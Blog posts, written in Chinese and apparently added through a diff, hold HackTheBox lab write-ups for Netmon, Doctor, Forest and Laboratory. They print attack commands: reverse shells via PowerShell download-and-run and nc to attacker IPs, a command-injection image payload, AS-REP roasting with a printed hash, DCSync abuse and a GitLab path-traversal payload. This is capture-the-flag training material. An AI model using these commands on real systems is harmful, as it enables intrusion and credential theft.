+<p><a href="https://tva1.sinaimg.cn/large/e6c9d24ely1go5p8olwlpj216y0o4dl8.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5p8olwlpj216y0o4dl8.jpg" alt="image-20210302174145263"></a></p>
+<p>使用msf的multi/http/tomcat_mgr_upload模块进行上传木马</p>
+<p><a href="https://tva1.sinaimg.cn/large/e6c9d24ely1go5p9w0nabj20mc05gjs0.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5p9w0nabj20mc05gjs0.jpg" alt="image-20210302174255158"></a></p>
+<p>同时找到两个flag</p>
+<p><a href="https://tva1.sinaimg.cn/large/e6c9d24ely1go5pmj8yuaj20y10u0jxm.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5pmj8yuaj20y10u0jxm.jpg" alt="image-20210302175504126"></a></p>
+<hr>
+<h2 id="5-10-You-know-0xDiablos"><a href="#5-10-You-know-0xDiablos" class="headerlink" title="5/10 You know 0xDiablos"></a>5/10 You know 0xDiablos</h2><p>逆向工程太难了</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goey6tzvqsj31gr0u0ka3.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goey6tzvqsj31gr0u0ka3.jpg" alt="image-20210310174126805"></a></p>
+<p>看了思路，还是不行，做不到</p>
+<h2 id="6-10-Netmon"><a href="#6-10-Netmon" class="headerlink" title="6/10 Netmon"></a>6/10 Netmon</h2><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goelcxroawj314n0u0agq.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goelcxroawj314n0u0agq.jpg" alt="image-20210310101731592"></a></p>
+<p>21 FTP允许匿名登陆</p>
+<p>FTP链接之后可以直接找到user flag</p>
+<p>User/Public/user.txt</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goekypdfo0j312y0gamyy.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goekypdfo0j312y0gamyy.jpg" alt="image-20210310100350863"></a></p>
+<p>80端口是PRTG</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goelrerg0ij317e0i4780.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goelrerg0ij317e0i4780.jpg" alt="image-20210310103126098"></a></p>
+<p>使用默认账户登录，发现密码不正确，找回密码功能发现账户是确实存在的</p>
+<p>搜索默认配置文件</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goem5t7es5j31380nqtpx.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goem5t7es5j31380nqtpx.jpg" alt="image-20210310104516638"></a></p>
+<p>都下载一下看看</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goem82zg7tj30yk07e42n.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goem82zg7tj30yk07e42n.jpg" alt="image-20210310104728204"></a></p>
+<p>这里看到有大哥的方法是使用md5sum查看文件md5 hash，发现备份.old文件跟conf文件内容一致，省下了翻看的时间</p>
+<p>搜索prtg configuration.dat</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goemclzwd9j30wa0sm0w8.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goemclzwd9j30wa0sm0w8.jpg" alt="image-20210310105148753"></a></p>
+<p>找到了账户密码，但是经过加密。从.bak文件中找了明文</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goeplovkufj30hk06q3z3.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goeplovkufj30hk06q3z3.jpg" alt="image-20210310124420445"></a></p>
+<p>将年份换为2019登录成功</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goeruoxuj9j311a0u0du0.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goeruoxuj9j311a0u0du0.jpg" alt="image-20210310140211538"></a></p>
+<p><a href="https://www.exploit-db.com/exploits/46527">CVE-2018-9276</a></p>
+<p>Account Settings—Notifications—TicketNotification</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goeruhnne1j311a0u0k0k.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goeruhnne1j311a0u0k0k.jpg" alt="image-20210310140159394"></a></p>
+<p>本地监听icmp报文</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">tcpdump</span> -i utun<span class="number">2</span> icmp</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goewieypxpj311a0u0n6o.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goewieypxpj311a0u0n6o.jpg" alt="image-20210310164323031"></a></p>
+<p>发送Notification，得到icmp报文，命令执行成功</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goewhpbazkj316q0lqjyl.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goewhpbazkj316q0lqjyl.jpg" alt="image-20210310164235672"></a></p>
+<p>利用powercat反弹shell，在命令执行处插入，本地监听端口</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">powershell</span> IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://<span class="number">10.10.14.33</span>/powercat.ps<span class="number">1</span>&#x27;)｜ powercat -c <span class="number">10.10.14.3</span> -p <span class="number">9999</span> -e cmd</span><br></pre></td></tr></table></figure>
+
+<p>不成功，得知是脚本内容未被转义导致的</p>
+<p>更换nishang的reverse shell，将Invoke-PowerShellTcp.ps1编码</p>
+<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat Desktop/Invoke-PowerShellTcp.ps1 | <span class="type">iconv</span> -t UTF<span class="number">-16</span>LE | <span class="type">base64</span> -w0 | <span class="type">xclip</span> -selection c</span><br><span class="line"></span><br><span class="line">代码解释：</span><br><span class="line"></span><br><span class="line">iconv -t UTF<span class="number">-16</span>LE :把内容转为UTF<span class="number">-16</span>LE的类型</span><br><span class="line"></span><br><span class="line">base64 -w0：转为base64格式   -w0 表示不换行</span><br><span class="line"></span><br><span class="line">xclip -selection c ：终端输出保存到剪切板中</span><br></pre></td></tr></table></figure>
+
+<p>powershell -enc 编码，本地监听，发送Notification，得到shell</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goex4iz3f4j311a0u0k0p.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goex4iz3f4j311a0u0k0p.jpg" alt="image-20210310170438014"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1goex3wr0adj30fs032aaa.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1goex3wr0adj30fs032aaa.jpg" alt="image-20210310170402750"></a></p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Doctor</title>
+    <url>/2021/11/04/HackTheBox-Doctor/</url>
+    <content><![CDATA[<h3 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h3><p>[<img src="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20210125110157665.png" alt="image-20210125110157665">](<a href="https://fre4k5en.me/Users/fre4k5en/Library/Application">https://fre4k5en.me/Users/fre4k5en/Library/Application</a> Support/typora-user-images/image-20210125110157665.png)</p>
+<p>访问80、8089</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzszb514hj31570u0b2c.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzszb514hj31570u0b2c.jpg" alt="image-20210125115723425"></a></p>
+<span id="more"></span>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrgqca7j30r40q8q4x.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrgqca7j30r40q8q4x.jpg" alt="image-20210125114952150"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrrfekyj30ow0cs74u.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsrrfekyj30ow0cs74u.jpg" alt="image-20210125115009375"></a></p>
+<p>有一个splunk登陆点，但是使用默认口令admin:changeme登录失败</p>
+<p>添加hosts记录</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">10.129.89.77</span>	doctors.htb</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzstfqxtij30u00xfgo4.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzstfqxtij30u00xfgo4.jpg" alt="image-20210125115145285"></a></p>
+<p>“医生安全消息”平台，注册登录</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsuwdz4oj30u00mc0v1.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsuwdz4oj30u00mc0v1.jpg" alt="image-20210125115310662"></a></p>
+<p>URL中发现用户名，更改为admin尝试</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsvgeyibj30uu0niju0.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmzsvgeyibj30uu0niju0.jpg" alt="image-20210125115342542"></a></p>
+<p>没有有价值的信息</p>
+<p>想到使用邮箱登录，尝试爆破<a href="mailto:info@doctors.htb">info@doctors.htb</a>账户</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img src=http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">14.182</span><span class="regexp">/$(nc.traditional$IFS-e$IFS/</span>bin/bash<span class="variable">$IFS</span><span class="string">&#x27;10.10.14.182&#x27;</span><span class="variable">$IFS</span><span class="string">&#x27;9999&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Forest</title>
+    <url>/2021/11/04/HackTheBox-Forest/</url>
+    <content><![CDATA[<h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a>Gathering information</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Nmap -<span class="keyword">sC</span> -sV -p- <span class="keyword">forest</span>.htb</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glnitjnp35j31350u0aln.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnitjnp35j31350u0aln.jpg" alt="image-20201214173846004"></a></p>
+<p>53端口开放了DNS服务，445端口开放了SMB服务，5985端口windows远程管理服务，域名为htb.local</p>
+<span id="more"></span>
+
+<p>查看域名解析记录</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">dig</span> @<span class="number">10.129.1.77</span> forest.htb</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glnh33emnmj30yw0lkn0k.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnh33emnmj30yw0lkn0k.jpg" alt="image-20201214163839196"></a></p>
+<p>查看SMB共享，这里允许匿名登录但是没有共享内容</p>
+<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">smbclient -<span class="built_in">N</span> -L forest.htb</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glnh5vltvvj30q005igm3.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnh5vltvvj30q005igm3.jpg" alt="image-20201214164125854"></a></p>
+<p>RPC(Remote Procedure Call，远程过程调用)，用于不同服务器之间调用方法，RPC框架把不同的调用方法封装起来，可以使得调用远程方法像调用本地方法一样简单</p>
+<p>利用Samba套件下的rpcclient查看rpc服务，匿名登录</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># rpcclient forest.htb -U%</span></span><br><span class="line">rpcclient <span class="variable">$&gt;</span> enumdomusers</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glnhk97nb2j30m60tcafg.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnhk97nb2j30m60tcafg.jpg" alt="image-20201214165513974"></a></p>
+<p>爆出了很多用户名，我们把SM_<em>和Health</em>去掉，整理一下得到以下用户</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glnho2vfltj30fk0a0q3k.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnho2vfltj30fk0a0q3k.jpg" alt="image-20201214165855239"></a></p>
+<h3 id="爆破低权限账户凭证"><a href="#爆破低权限账户凭证" class="headerlink" title="爆破低权限账户凭证"></a>爆破低权限账户凭证</h3><p>Kerberos安全框架通常需要密码验证，但是存在选项“Do not require Kerberos preauthentication” 或 UF_DONT_REQUIRE_PREAUTH，如果被设置为true，则不需要Kerberos预身份验证就可导出密码</p>
+<p>利用impacket套件中的GetNPUsers.py脚本</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glni8m2oepj31ow0dg0wp.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glni8m2oepj31ow0dg0wp.jpg" alt="image-20201214171839320"></a></p>
+<p>可以获取到用户svc-alfresco的加密密码</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$krb<span class="number">5</span>asrep$svc-alfresco<span class="title">@HTB.LOCAL</span>:ce<span class="number">4</span>fa<span class="number">143712</span>d<span class="number">710440</span>cd<span class="number">0e93</span>b<span class="number">77542</span><span class="keyword">c</span><span class="number">1</span>$<span class="number">41595</span><span class="keyword">c</span><span class="number">658e3</span><span class="keyword">c</span><span class="number">839195</span>f<span class="number">999</span>dad<span class="number">62</span><span class="keyword">c</span><span class="number">36</span><span class="keyword">c</span><span class="number">80</span>d<span class="number">1</span>db<span class="number">8892</span>f<span class="number">41</span>d<span class="number">8</span>f<span class="number">497797</span><span class="keyword">c</span><span class="number">24</span>ebe<span class="number">60</span>f<span class="number">39</span>a<span class="number">7</span>d<span class="number">316133</span>f<span class="number">18539</span>f<span class="number">6</span>bb<span class="number">4</span>ccd<span class="number">0</span>cfc<span class="number">81</span>f<span class="number">610</span><span class="keyword">c</span><span class="number">61</span>ec<span class="number">51</span>b<span class="number">8e1</span>f<span class="number">6</span>b<span class="number">5050</span>a<span class="number">72e78267</span>ab<span class="number">18</span>fd<span class="number">18</span>ef<span class="number">93</span>f<span class="number">456</span>dddf<span class="number">6</span>ec<span class="number">9997</span>a<span class="number">69</span>f<span class="number">3</span>b<span class="number">331e84377</span>f<span class="number">4e04777</span>e<span class="number">9</span>d<span class="number">5948</span>ffa<span class="number">823953</span>aa<span class="number">58</span>d<span class="number">3</span>ab<span class="number">72</span>b<span class="number">52</span>ea<span class="number">76</span><span class="keyword">c</span><span class="number">1377</span><span class="keyword">c</span><span class="number">750264</span>d<span class="number">19</span>a<span class="number">8988</span>d<span class="number">219576</span><span class="keyword">c</span><span class="number">8</span>a<span class="number">5797</span>fc<span class="number">5</span>cb<span class="number">437</span>a<span class="number">588</span>a<span class="number">4764e65993</span>a<span class="number">07</span><span class="keyword">c</span><span class="number">61</span>cafddaddca<span class="number">9</span>bf<span class="number">627e3396</span>f<span class="number">193</span><span class="keyword">c</span><span class="number">3</span>aba<span class="number">1323</span>aeafc<span class="number">1</span>a<span class="number">25845056e133</span>a<span class="number">5e3</span>b<span class="number">7</span>f<span class="number">488</span>ed<span class="number">5</span>cf<span class="number">3e4</span>b<span class="number">26</span>faa<span class="number">60</span>cf<span class="number">42e99</span>f<span class="number">86</span>bded<span class="number">9</span>a<span class="number">3e5</span>bbb<span class="number">1</span>d<span class="number">1</span>a<span class="number">818</span>f<span class="number">1022586426</span>aba<span class="number">76e04</span>e<span class="number">0</span>b<span class="number">04</span><span class="keyword">c</span><span class="number">5</span><span class="keyword">c</span><span class="number">04e4</span>da<span class="number">05</span>d<span class="number">1</span>af<span class="number">3</span>ef<span class="number">85</span>d<span class="number">85</span>a<span class="number">1</span><span class="keyword">c</span><span class="number">4</span>d<span class="number">2</span>ae<span class="number">9</span>b<span class="number">501</span><span class="keyword">c</span><span class="number">5026</span>ac<span class="number">8900</span>ed<span class="number">105</span>ddd<span class="number">0e8</span></span><br></pre></td></tr></table></figure>
+
+<p>上JohnTheRipper或者hashcat，采用kali自带的rockyou字典</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glniflrc08j31kw07ytam.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glniflrc08j31kw07ytam.jpg" alt="image-20201214172522067"></a></p>
+<p>密码为s3rvice</p>
+<p>下载安装evil-winrm，通过5985端口连接服务器</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">gem</span> install evil-winrm</span><br><span class="line"></span><br><span class="line"><span class="attribute">evil</span>-winrm -i <span class="number">10.129.1.77</span> -u svc-alfresco -p s<span class="number">3</span>rvice -P <span class="number">5985</span> </span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glnimjmcnhj324g0rotes.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnimjmcnhj324g0rotes.jpg" alt="image-20201214173202854"></a></p>
+<p>得到svc-alfresco账户权限</p>
+<h3 id="获取系统权限"><a href="#获取系统权限" class="headerlink" title="获取系统权限"></a>获取系统权限</h3><p>将我们准备好的sharphound.exe上传并收集信息，再将结果下载到hound环境，选择Find Shortest Paths to Domain Admins（寻找到域管理员的最短路径）</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>vc-alfresco<span class="symbol">\D</span>ocuments&gt; upload /root/SharpHound.exe</span><br><span class="line">*Evil-WinRM* PS C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>vc-alfresco<span class="symbol">\D</span>ocuments&gt; ./SharpHound.exe -c all</span><br><span class="line">*Evil-WinRM* PS C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>vc-alfresco<span class="symbol">\D</span>ocuments&gt; download xxx.zip</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1gloobhb2f7j31c80sq79o.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gloobhb2f7j31c80sq79o.jpg" alt="image-20201215173431845"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1gloo8rxpg6j30u00vfn15.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gloo8rxpg6j30u00vfn15.jpg" alt="image-20201215173150914"></a></p>
+<p>可以看到我们是exchange组的成员，而exchange组对htb.local有一个叫做WriteDacL的权限，通过初步学习得知，通过writedacl权限，我们可以使用dcsync:mimikatz从krbtgt账户的hash制作Golden TIcket（黄金票据），登录域控。而Exchage Trusted Subsystem（exchage信任的子系统）也有这个权限，控制这个子系统的是account operatiors（账户操作员），而我们正是这个组的成员。</p>
+<h5 id="新建账户5en，将svc-alfresco加入exchange组"><a href="#新建账户5en，将svc-alfresco加入exchange组" class="headerlink" title="新建账户5en，将svc-alfresco加入exchange组"></a>新建账户5en，将svc-alfresco加入exchange组</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net<span class="built_in"> user </span>账户 密码 /<span class="builtin-name">add</span> /domain</span><br><span class="line"></span><br><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net<span class="built_in"> group </span><span class="string">&quot;Exchange Windows Permissions&quot;</span> svc-alfresco /<span class="builtin-name">add</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net<span class="built_in"> group </span><span class="string">&quot;Exchange Trusted Subsystem&quot;</span> svc-alfresco /<span class="builtin-name">add</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup &quot;Remote Management Users&quot; svc-alfresco /add</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="赋予5en账户DCSync权限"><a href="#赋予5en账户DCSync权限" class="headerlink" title="赋予5en账户DCSync权限"></a>赋予5en账户DCSync权限</h5><p>hound中自带了WriteDacL的help，里面有利用方式</p>
+<blockquote>
+<p>To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.</p>
+<p>–要对域对象使用WriteDacl，你需要赋予自己DcSync权限</p>
+<p>You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS <a href="mailto:PERMISSIONS@HTB.LOCAL">PERMISSIONS@HTB.LOCAL</a> if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):</p>
+<p>–如果你不是EXCHANGE WINDOWS <a href="mailto:PERMISSIONS@HTB.LOCAL">PERMISSIONS@HTB.LOCAL</a>对成员，你需要以它的成员的身份获取域控的凭证。结合Add-DomainObjectAcl功能，首先创建一个PS凭证对象（这些例子来自PowerView 帮助手册）</p>
+<p>$SecPassword = ConvertTo-SecureString ‘Password123!’ -As -Force<br>$Cred = New-Object System.Management.Automation.PSCredential(‘TESTLAB\dfm.a’, $SecPassword)</p>
+<p>Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS <a href="mailto:PERMISSIONS@HTB.LOCAL">PERMISSIONS@HTB.LOCAL</a>:</p>
+<p>–然后，使用Add-DomainObjectAcl，如果你没有在EXCHANGE WINDOWS <a href="mailto:PERMISSIONS@HTB.LOCAL">PERMISSIONS@HTB.LOCAL</a>中，可以选择具体的$Cred</p>
+<p>Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</p>
+<p>Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain</p>
+<p>–一旦你有了DCSync权限，你可以使用mimikatz dcsync功能获取域内任意账号的密码</p>
+<p>lsadump::dcsync /domain:testlab.local /user:Administrator</p>
+<p>Cleanup can be done using the Remove-DomainObjectAcl function:<br>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</p>
+<p>在使用Remove-DomainObjectAcl 方法后可以做清理</p>
+</blockquote>
+<p>–后为笔者三流英语译文</p>
+<p>按照hound中的流程走一遍</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glp1ccxl5zj30u00ur7dh.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glp1ccxl5zj30u00ur7dh.jpg" alt="image-20201216010512209"></a></p>
+<p>使用secretdump.py通过5en账户导出administrator的密码hash</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0semdr6j30xg0u07n1.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0semdr6j30xg0u07n1.jpg" alt="image-20201216004600962"></a></p>
+<p>psexec.py 通过hash连接目标administrator账户</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0vavsvaj30zy0gwgp6.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0vavsvaj30zy0gwgp6.jpg" alt="image-20201216004848556"></a></p>
+<p>获取系统权限</p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Laboratory</title>
+    <url>/2021/11/04/HackTheBox-Laboratory/</url>
+    <content><![CDATA[<h3 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h3><p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfb6rkbkj316w0qiwku.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfb6rkbkj316w0qiwku.jpg" alt="image-20210104095050359"></a></p>
+<span id="more"></span>
+
+<p>443端口有点意思</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfgk1agqj31i70u0gy1.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfgk1agqj31i70u0gy1.jpg" alt="image-20210104095602697"></a></p>
+<p>nmap结果中能看到DNS:git.laboratory.htb，访问后为gitlab登录界面，使用@laboratory.htb邮件域名注册账号登录，可看到版本号12.8.1</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfjq8g2oj31tq0u0n8h.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfjq8g2oj31tq0u0n8h.jpg" alt="image-20210104095905527"></a></p>
+<p>该版本存在CVE-2020-10977 任意文件读取漏洞</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>随便建立一个新project test，在项目中创建issue，中填入以下payload</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![a](<span class="regexp">/uploads/</span><span class="number">11111111111111111111111111111111</span><span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd)</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfpswziqj31hi0u0q84.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfpswziqj31hi0u0q84.jpg" alt="image-20210104100455923"></a></p>
+<p>[<img src="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20210104100630913.png" alt="image-20210104100630913">](<a href="https://fre4k5en.me/Users/fre4k5en/Library/Application">https://fre4k5en.me/Users/fre4k5en/Library/Application</a> Support/typora-user-images/image-20210104100630913.png)</p>
+<p>再新建另一个test1，将刚才的issue move到test1中，此时可以点击下载passwd文件</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfuiaa4aj30kq0dajs4.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfuiaa4aj30kq0dajs4.jpg" alt="image-20210104100927025"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfv43wwwj311w0n8gwj.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbfv43wwwj311w0n8gwj.jpg" alt="image-20210104101001681"></a></p>
+<p>使用msf中的gitlab_file_read_rce模块</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbg4fhwctj314c0u00x2.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbg4fhwctj314c0u00x2.jpg" alt="image-20210104101859927"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbg3qrfawj31ci09eabv.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbg3qrfawj31ci09eabv.jpg" alt="image-20210104101819833"></a></p>
+<p>成功getshell</p>
+<h3 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h3><p>在shell中登录gitlab-rails console，修改用户dexter的密码，因为他是公司ceo</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbqii85pyj30oi0ou76r.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbqii85pyj30oi0ou76r.jpg" alt="image-20210104161828184"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbqjq7mfsj30nq0yw42j.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbqjq7mfsj30nq0yw42j.jpg" alt="image-20210104161940711"></a></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">u = User.where(id:<span class="number">1</span>).first                                                      u.password = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">u.password_confirmation = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">u.save!</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>使用新密码登录gitlab后可以在他的项目中找到id_rsa</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbqlx42tkj30u01024la.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbqlx42tkj30u01024la.jpg" alt="image-20210104162146671"></a></p>
+<p>在本地创建id_rsa，粘贴内容，赋予600权限，因为。。。其它用户只要有权限，这个id_rsa就会被ignored</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbqn8owm9j30u0181tse.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbqn8owm9j30u0181tse.jpg" alt="image-20210104162303709"></a></p>
+<p>得到user flag</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbqp2mjebj30q609aq4h.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbqp2mjebj30q609aq4h.jpg" alt="image-20210104162449341"></a></p>
+<h3 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h3><p>Linpeas.sh找到了docker-security具有suid属性</p>
